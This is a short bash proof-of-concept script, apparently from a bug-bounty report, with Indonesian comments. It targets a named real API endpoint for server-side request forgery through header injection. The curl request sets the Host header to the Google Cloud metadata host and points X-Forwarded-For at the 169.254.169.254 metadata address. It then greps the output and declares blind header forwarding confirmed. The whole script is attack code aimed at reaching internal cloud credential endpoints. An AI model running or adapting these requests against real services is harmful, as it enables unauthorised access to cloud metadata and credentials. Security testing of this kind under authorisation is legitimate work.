#!/bin/bash
# PoC: SSRF via Arbitrary Header Injection
# Severity: HIGH

TARGET="https://api.sim.dune.com/v1/"

echo -e "\033[0;34m[+] Starting SSRF Header Injection Test...\033[0m"
echo -e "\033[0;34m[*] Note: This script tests for blind header forwarding in sim-proxy.\033[0m\n"

# host header injection and metadata
curl -v -s "$TARGET" \
  -H "Host: metadata.google.internal" \
  -H "X-Forwarded-For: http://169.254.169.254/latest/meta-data/" \
  -H "X-Real-IP: 1.2.3.4" 2>&1 | grep -E "> GET|> Host|> X-Forwarded|> X-Real"

echo -e "\n\033[1;33m[Conclusion]\033[0m"
echo "Jika log di atas menunjukkan 'Host: metadata.google.internal' berhasil dikirim ke server Dune,"
echo "maka sim-proxy melakukan blind-forwarding header tanpa sanitasi (Confirmed via Source Code Analysis)."
